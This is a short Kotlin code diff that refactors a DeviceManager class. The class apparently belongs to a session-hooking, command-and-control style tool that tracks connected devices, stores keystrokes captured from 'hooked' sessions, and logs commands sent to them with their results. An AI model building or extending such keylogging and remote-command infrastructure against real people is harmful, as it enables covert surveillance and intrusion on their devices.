@@ -37,8 +37,6 @@ class DeviceManager {
     private val sessions = ConcurrentHashMap<String, HookedSession>()
     private val _deviceList = MutableStateFlow<List<ConnectedDevice>>(emptyList())
     val deviceList: StateFlow<List<ConnectedDevice>> = _deviceList
-    private val _hookedCount = MutableStateFlow(0)
-    val hookedCount: StateFlow<Int> = _hookedCount
 
     fun trackRequest(ip: String, userAgent: String?, bytes: Long) {
         val device = devices.getOrPut(ip) { ConnectedDevice(ip = ip) }
@@ -56,17 +54,14 @@ class DeviceManager {
     }
 
     fun getSession(sessionId: String): HookedSession? = sessions[sessionId]
+    fun getDevice(ip: String): ConnectedDevice? = devices[ip]
     fun markDisconnected(sessionId: String) { sessions[sessionId]?.isAlive = false; refreshList() }
     fun appendKeylog(sessionId: String, keys: List<KeyEvent>) { sessions[sessionId]?.keylog?.addAll(keys) }
     fun recordCommand(sessionId: String, record: CommandRecord) { sessions[sessionId]?.commandHistory?.add(record) }
     fun updateCommandResult(sessionId: String, commandId: String, result: String?, error: String?) {
         sessions[sessionId]?.commandHistory?.find { it.id == commandId }?.apply { this.result = result; this.error = error }
     }
-    fun getDevice(ip: String): ConnectedDevice? = devices[ip]
-    fun getAllDevices(): List<ConnectedDevice> = devices.values.toList()
+    fun getAllDevices(): List<ConnectedDevice> = devices.values.toList().sortedByDescending { it.lastSeen }
     fun getHookedSessions(): List<HookedSession> = sessions.values.filter { it.isAlive }
-    private fun refreshList() {
-        _deviceList.value = devices.values.toList().sortedByDescending { it.lastSeen }
-        _hookedCount.value = sessions.values.count { it.isAlive }
-    }
+    private fun refreshList() { _deviceList.value = devices.values.toList().sortedByDescending { it.lastSeen } }
 }
